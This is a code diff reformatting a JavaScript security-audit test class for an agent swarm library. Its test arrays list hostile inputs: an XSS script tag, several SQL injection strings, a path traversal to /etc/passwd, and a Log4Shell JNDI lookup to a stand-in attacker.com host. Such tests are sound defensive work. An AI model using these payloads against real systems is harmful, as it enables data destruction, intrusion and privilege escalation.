@@ -86,7 +86,7 @@ class SecurityAuditor {
       // Test malicious inputs
       const maliciousInputs = [
         '"><script>alert("xss")</script>',
-        "'; DROP TABLE agents; --",
+        '\'; DROP TABLE agents; --',
         '../../../etc/passwd',
         '${jndi:ldap://attacker.com/x}',
         '<img src=x onerror=alert(1)>',
@@ -154,13 +154,13 @@ class SecurityAuditor {
       await persistence.initialize();
 
       const sqlInjectionAttempts = [
-        "'; DROP TABLE agents; --",
-        "' OR '1'='1",
-        "' UNION SELECT * FROM sqlite_master --",
-        "'; INSERT INTO agents VALUES (999, 'hacker'); --",
-        "' OR 1=1 --",
-        "'; UPDATE agents SET type='admin' WHERE 1=1; --",
-        "' AND (SELECT COUNT(*) FROM sqlite_master) > 0 --",
+        '\'; DROP TABLE agents; --',
+        '\' OR \'1\'=\'1',
+        '\' UNION SELECT * FROM sqlite_master --',
+        '\'; INSERT INTO agents VALUES (999, \'hacker\'); --',
+        '\' OR 1=1 --',
+        '\'; UPDATE agents SET type=\'admin\' WHERE 1=1; --',
+        '\' AND (SELECT COUNT(*) FROM sqlite_master) > 0 --',
       ];
 
       for (const injection of sqlInjectionAttempts) {
@@ -463,7 +463,7 @@ class SecurityAuditor {
       const accessTests = [
         {
           name: 'Agent Isolation',
-          description: "Agents cannot access each other's private data",
+          description: 'Agents cannot access each other\'s private data',
           test: async () => {
             const ruvSwarm = await ZenSwarm.initialize();
             const swarm = await ruvSwarm.createSwarm({ topology: 'mesh', maxAgents: 2 });
@@ -638,8 +638,8 @@ class SecurityAuditor {
         await Promise.all(
           agents.map(
             (agent) =>
-              agent.execute({ task: `Memory test iteration ${i}`, timeout: 2000 }).catch(() => {}) // Ignore errors for this test
-          )
+              agent.execute({ task: `Memory test iteration ${i}`, timeout: 2000 }).catch(() => {}), // Ignore errors for this test
+          ),
         );
 
         // Clean up references
@@ -659,7 +659,7 @@ class SecurityAuditor {
           if (growth > 10 * 1024 * 1024) {
             // More than 10MB growth
             console.warn(
-              `Memory growth detected at iteration ${i}: ${Math.round(growth / 1024 / 1024)}MB`
+              `Memory growth detected at iteration ${i}: ${Math.round(growth / 1024 / 1024)}MB`,
             );
           }
         }
@@ -933,7 +933,7 @@ class SecurityAuditor {
 
     this.auditResults.overallSecurity.score = Math.max(
       0,
-      baseScore - securityPenalty - memoryPenalty
+      baseScore - securityPenalty - memoryPenalty,
     );
 
     // Determine security level
